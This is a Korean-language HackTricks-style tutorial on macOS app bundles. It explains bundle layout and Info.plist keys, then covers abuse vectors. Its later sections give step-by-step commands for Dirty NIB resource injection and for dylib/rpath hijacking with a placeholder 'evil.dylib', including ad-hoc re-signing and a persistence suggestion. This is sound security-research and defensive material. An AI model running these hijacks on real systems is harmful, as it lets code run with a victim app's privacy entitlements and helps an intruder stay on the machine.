# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

macOS의 Bundles는 애플리케이션, libraries 및 기타 필요한 파일을 포함한 다양한 리소스의 container 역할을 하며, Finder에서는 익숙한 `*.app` 파일과 같이 단일 객체로 표시됩니다. 가장 일반적으로 접하는 bundle은 `.app` bundle이지만, `.framework`, `.systemextension` 및 `.kext`와 같은 다른 유형도 널리 사용됩니다.

### Bundle의 필수 구성 요소

Bundle 내부, 특히 `<application>.app/Contents/` directory에는 다양한 중요 리소스가 포함되어 있습니다.

- **\_CodeSignature**: 이 directory에는 애플리케이션의 무결성을 검증하는 데 중요한 code-signing 정보가 저장됩니다. 다음과 같은 commands를 사용하여 code-signing 정보를 확인할 수 있습니다:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: 사용자 상호작용 시 실행되는 애플리케이션의 executable binary를 포함합니다.
- **Resources**: 이미지, 문서, 인터페이스 설명(nib/xib files)을 비롯한 애플리케이션의 user interface 구성 요소를 저장합니다.
- **Info.plist**: 애플리케이션의 주요 configuration file로 작동하며, 시스템이 애플리케이션을 적절히 인식하고 상호작용하는 데 필수적입니다.

#### Info.plist의 주요 키

`Info.plist` file은 다음과 같은 키를 포함하는 애플리케이션 configuration의 핵심 요소입니다.

- **CFBundleExecutable**: `Contents/MacOS` directory에 있는 main executable file의 이름을 지정합니다.
- **CFBundleIdentifier**: 애플리케이션의 global identifier를 제공하며, macOS가 애플리케이션을 관리할 때 광범위하게 사용합니다.
- **LSMinimumSystemVersion**: 애플리케이션을 실행하는 데 필요한 macOS의 minimum version을 나타냅니다.

### Bundles 탐색

`Safari.app`과 같은 bundle의 내용을 탐색하려면 다음 command를 사용할 수 있습니다: `bash ls -lR /Applications/Safari.app/Contents`

이 탐색을 통해 `_CodeSignature`, `MacOS`, `Resources`와 같은 directories 및 `Info.plist`와 같은 files를 확인할 수 있습니다. 각 항목은 애플리케이션 보안부터 user interface 및 operational parameters 정의까지 고유한 역할을 수행합니다.

#### 추가 Bundle Directories

일반적인 directories 외에도 bundles에는 다음 항목이 포함될 수 있습니다.

- **Frameworks**: 애플리케이션에서 사용하는 bundled frameworks를 포함합니다. Frameworks는 추가 resources가 포함된 dylibs와 같습니다.
- **PlugIns**: 애플리케이션의 capabilities를 향상시키는 plug-ins 및 extensions를 위한 directory입니다.
- **XPCServices**: 애플리케이션이 process 외부 통신에 사용하는 XPC services를 저장합니다.

이 구조는 필요한 모든 구성 요소를 bundle 내부에 캡슐화하여 modular하고 안전한 애플리케이션 환경을 제공합니다.

`Info.plist` keys와 그 의미에 대한 자세한 정보는 Apple developer documentation에서 확인할 수 있습니다: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: quarantined bundle이 처음 실행되면 macOS는 deep signature verification을 수행하고 randomized translocated path에서 실행할 수 있습니다. 일단 허용되면 이후 실행에서는 shallow checks만 수행하며, `Resources/`, `PlugIns/`, nibs 등의 resource files는 역사적으로 검사되지 않았습니다. macOS 13 Ventura부터는 첫 실행 시 deep check가 적용되고, 새로운 *App Management* TCC permission은 사용자 동의 없이 third-party processes가 다른 bundles를 수정하지 못하도록 제한하지만, 이전 systems는 여전히 취약합니다.
- **Bundle Identifier collisions**: 동일한 `CFBundleIdentifier`를 재사용하는 여러 embedded targets(PlugIns, helper tools)는 signature validation을 손상시키고 때때로 URL-scheme hijacking/confusion을 가능하게 할 수 있습니다. 항상 sub-bundles를 열거하고 고유한 IDs를 검증해야 합니다.

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura 이전에는 signed app의 UI resources를 교체하여 shallow code signing을 우회하고 해당 app의 entitlements로 code execution을 수행할 수 있었습니다. 현재 research(2024)에 따르면 이는 pre-Ventura 및 un-quarantined builds에서 여전히 작동합니다:<sup>[[1]](#references)[[2]](#references)</sup>

1. Target app을 writable location(예: `/tmp/Victim.app`)으로 복사합니다.
2. `Contents/Resources/MainMenu.nib`(또는 `NSMainNibFile`에 선언된 임의의 nib)를 `NSAppleScript`, `NSTask` 등을 instantiate하는 malicious one으로 교체합니다.
3. App을 실행합니다. Malicious nib는 victim의 bundle ID 및 entitlements(TCC grants, microphone/camera 등)로 실행됩니다.
4. Ventura+에서는 첫 실행 시 bundle을 deep-verifying하고 이후 수정에 *App Management* permission을 요구하여 이를 완화하므로 persistence는 더 어려워졌지만, 이전 macOS에서의 initial-launch attacks에는 여전히 적용됩니다.<sup>[[1]](#references)</sup>

Minimal malicious nib payload example (`ibtool`을 사용하여 xib를 nib로 compile):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundles 내부의 Framework / PlugIn / dylib Hijacking

`@rpath` lookup은 bundled Frameworks/PlugIns를 우선하므로, `Contents/Frameworks/` 또는 `Contents/PlugIns/` 내부에 malicious library를 배치하면 main binary가 library validation 없이 서명되었거나 `LC_RPATH` 순서가 취약할 때 load order를 redirect할 수 있습니다.

unsigned/ad-hoc bundle을 악용할 때의 일반적인 단계:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
참고:
- `com.apple.security.cs.disable-library-validation`이 없는 Hardened runtime은 third-party dylibs를 차단합니다. 먼저 entitlements를 확인하세요.
- `Contents/XPCServices/` 아래의 XPC services는 sibling frameworks를 로드하는 경우가 많습니다. persistence 또는 privilege escalation 경로를 위해 해당 바이너리에도 유사한 patch를 적용하세요.

## 빠른 검사 Cheatsheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 참고 자료

- [1] [process injection을 공개적으로 다루기: nib files를 사용한 macOS 앱 exploit (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB 및 bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
